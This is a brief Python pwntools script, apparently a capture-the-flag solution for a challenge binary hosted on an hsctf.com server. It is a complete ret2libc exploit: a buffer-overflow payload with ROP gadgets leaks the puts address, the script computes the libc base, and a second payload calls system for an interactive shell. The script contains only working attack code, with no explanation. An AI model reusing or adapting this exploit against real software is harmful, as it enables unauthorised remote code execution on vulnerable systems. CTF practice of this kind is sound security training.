from pwn import *

context.binary = elf = ELF('./ex')
libc = ELF('./libc.so')

io = remote('ex.hsctf.com', 1337)
#io = process()
# gdb.attach(io, api=True)

# Gadgets
offset = b'i'*40
pop_rdi = 0x4014f3
ret = 0x40101a
one = 0xe3afe

payload = offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(ret) + p64(elf.sym['main'])
io.sendline(payload)
io.recvuntil(b'?\n')
io.sendline(b'Q')
leaks = u64(io.recv()[:-1].ljust(8,b'\0'))
libc.address = leaks - libc.sym['puts']
print(hex(libc.address))
#io.interactive()

payload = offset + p64(pop_rdi) + p64(libc.address + 0x1b45bd) + p64(libc.sym['system'])
io.sendline(payload)
io.sendline(b'Q')

io.interactive()